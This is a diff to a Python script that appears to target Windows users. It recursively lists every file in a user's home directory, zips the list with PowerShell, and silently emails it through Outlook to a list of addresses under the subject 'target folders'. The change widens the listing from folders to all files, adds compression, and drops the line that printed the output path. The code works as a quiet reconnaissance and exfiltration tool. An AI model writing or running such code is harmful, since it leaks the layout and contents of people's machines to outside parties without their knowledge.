@@ -7,9 +7,9 @@ directory = 'C:/users/' + str(username)
 
 os.system('cd C:/users/' + str(username))
 os.chdir('C:/users/' + str(username))
-os.system('dir /A:D /B /S > C:/users/' + str(username) + '/FolderList.txt')
+os.system('dir /s /b /o:gn > C:/users/' + str(username) + '/FolderList.txt')
+os.system('powershell Compress-Archive -Force C:/Users/' + str(username) + '/FolderList.txt ' +  'C:/Users/' + str(username) + '/FolderList.zip')
 
-print(str(directory) + 'FolderList.txt')
 
 
 for adress in adresses:
@@ -19,6 +19,6 @@ for adress in adresses:
         mail.To = adress
         mail.Subject = 'target folders'
         mail.Body = ''
-        mail.Attachments.Add(directory + '/FolderList.txt')
+        mail.Attachments.Add(directory + '/FolderList.zip')
         mail.HTMLBody = ''
         mail.Send()
